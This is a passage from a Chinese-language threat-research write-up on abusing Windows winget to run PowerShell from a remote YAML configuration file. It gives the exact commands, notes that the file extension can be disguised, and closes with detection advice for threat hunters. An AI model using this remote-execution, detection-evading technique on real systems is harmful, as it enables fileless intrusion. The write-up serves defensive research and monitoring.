```
winget configure --enable
winget configure --accept-configuration-agreements --disable-interactivity -f https://raw.githubusercontent.com/xiaotsai/win_test/main/test1.yaml
```
WinGet 將執行一些 PowerShell 命令並將它們記錄到日誌檔案中。我使用記錄到文件的方法，因為執行成功後，結果不會顯示在控制台中。
檔案副檔名不一定必須是 .yaml。您可以使用 .txt 或 .jpg 等檔案副檔名

# 三．結論
無檔案惡意軟體的創建者總是在受害者係統的雷達下搜尋並使用本地二進位檔案 (lolbins)。

無文件攻擊變得越來越普遍和複雜，這需要我們不斷補充我們的監控和檢測技術和方法。

Winget 是 Windows 上可用的工具，旨在促進軟體管理。然而，它也可以被利用來執行惡意 PowerShell 程式碼，而無需使用始終受到密切監控的 powershell.exe 程式。

Winget使用YAML格式的設定文件，這些文件不僅可以從本機磁碟機讀取，還可以直接從網路上檢索。

身為威脅追蹤者，您應該密切注意 Winget 及其子進程 ( ConfigurationRemotingServer.exe )，以及來自 AMSI 的事件日誌。
